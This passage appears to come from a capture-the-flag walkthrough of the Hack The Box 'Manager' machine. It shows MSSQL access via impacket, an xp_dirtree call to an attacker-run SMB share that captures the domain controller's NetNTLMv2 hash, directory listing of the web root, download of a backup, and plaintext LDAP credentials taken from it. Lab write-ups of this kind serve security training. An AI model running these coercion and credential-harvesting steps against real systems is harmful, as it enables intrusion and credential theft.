We connect to the DB with impacket-mssqlclient

```bash
┌──(kali㉿kali)-[~]
└─$ impacket-mssqlclient -p 1433 -windows-auth -dc-ip 10.10.11.236 "manager.htb/operator:operator"@10.10.11.236
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (MANAGER\Operator  guest@master)>
```

Following **[hacktricks relay attack guide](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack)** we can steal the hash. We have to setup a smb share and list the folder inside mssql

```bash
SQL (MANAGER\Operator  guest@msdb)> xp_dirtree \\10.10.14.11\share\any

-------------

┌──(kali㉿kali)-[~/Documents/Boxes/Manager-10.10.11.236]
└─$ sudo impacket-smbserver share -smb2support .
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.236,61016)
[*] AUTHENTICATE_MESSAGE (MANAGER\DC01$,DC01)
[*] User DC01\DC01$ authenticated successfully
[*] DC01$::MANAGER:aaaaaaaaaaaaaaaa:3fd9abd1a11e4a57e069c9188cb83006:010100000000000080addd1fb91cda0159720936877d145a000000000100100044006d005700410064004a00480077000300100044006d005700410064004a00480077000200100041006d004500660063007800460074000400100041006d004500660063007800460074000700080080addd1fb91cda01060004000200000008003000300000000000000000000000003000005bf0037d72ab0f2d4b11a72d9ef4c958cd2f0fce8c0119365f8c77d29261eb270a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310031000000000000000000
```

We cannot crack it and we couldn't use it in a Pth attack. Looking for useful info executing the command xp_dirtree (`EXEc xp_dirtree 'C:\<location>', 1, 1;`) we found a backup zip file inside `C:\inetpub\wwwroot` folder (its a **[server folder](https://tecnowindows.com/que-es-la-carpeta-inetpub-y-para-que-sirve/)**)

```bash
SQL (MANAGER\Operator  guest@msdb)> EXEc xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
subdirectory                      depth   file   
-------------------------------   -----   ----   
about.html                            1      1   
contact.html                          1      1   
css                                   1      0   
images                                1      0   
index.html                            1      1   
js                                    1      0   
service.html                          1      1   
web.config                            1      1   
website-backup-27-07-23-old.zip       1      1

-----------------

┌──(kali㉿kali)-[~/Documents/Boxes/Manager-10.10.11.236]
└─$ wget 10.10.11.236/website-backup-27-07-23-old.zip
--2023-11-21 21:39:20--  http://10.10.11.236/website-backup-27-07-23-old.zip
Connecting to 10.10.11.236:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1045328 (1021K) [application/x-zip-compressed]
Saving to: ‘website-backup-27-07-23-old.zip’

website-backup-27-07-23-old. 100%[==============================================>]   1021K  1.33MB/s    in 0.8s    
2023-11-21 21:39:21 (1.33 MB/s) - ‘website-backup-27-07-23-old.zip’ saved [1045328/1045328]
```

Here we find a config.xml file with raven credentials for LDAP service

```XML
<host>dc01.manager.htb</host>
<open-port enabled="true">389</open-port>
<secure-port enabled="false">0</secure-port>
<search-base>dc=manager,dc=htb</search-base>
<server-type>microsoft</server-type>
<access-user>
<user>raven@manager.htb</user>
<password>R4v3nBe5tD3veloP3r!123</password>
</access-user>
```

Now we can access through WinRM